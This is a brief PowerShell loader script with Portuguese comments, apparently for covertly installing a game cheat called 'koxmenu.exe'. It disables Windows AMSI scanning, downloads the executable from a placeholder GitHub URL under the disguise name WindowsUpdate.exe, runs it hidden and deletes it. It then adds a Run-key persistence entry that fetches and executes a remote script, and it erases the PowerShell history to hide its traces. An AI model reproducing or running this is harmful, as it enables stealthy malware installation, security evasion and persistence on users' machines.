# Bypass do AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# O link RAW do SEU koxmenu.exe (Substitua pelo seu link Raw do GitHub)
$url = "https://raw.githubusercontent.com/SeuUsuario/SeuRepo/main/koxmenu.exe"

# Caminho onde o cheat vai ser salvo temporariamente
$tempPath = "$env:TEMP\WindowsUpdate.exe"

# Baixa o cheat
Invoke-WebRequest -Uri $url -OutFile $tempPath

# Roda o cheat de forma invisível (sem janela) e como Administrador
Start-Process -FilePath $tempPath -WindowStyle Hidden

# Espera 3 segundos e deleta o arquivo do disco para não deixar rastro
Start-Sleep -Seconds 3
Remove-Item -Path $tempPath -Force

# Persistência (Registra no Run do Windows para reiniciar junto com o PC)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$cmd = "powershell -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SeuUsuario/SeuRepo/main/sync.ps1')`""
Set-ItemProperty -Path $regPath -Name "WindowsSyncClient" -Value $cmd

# Limpa o histórico do PowerShell para não deixar rastro
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
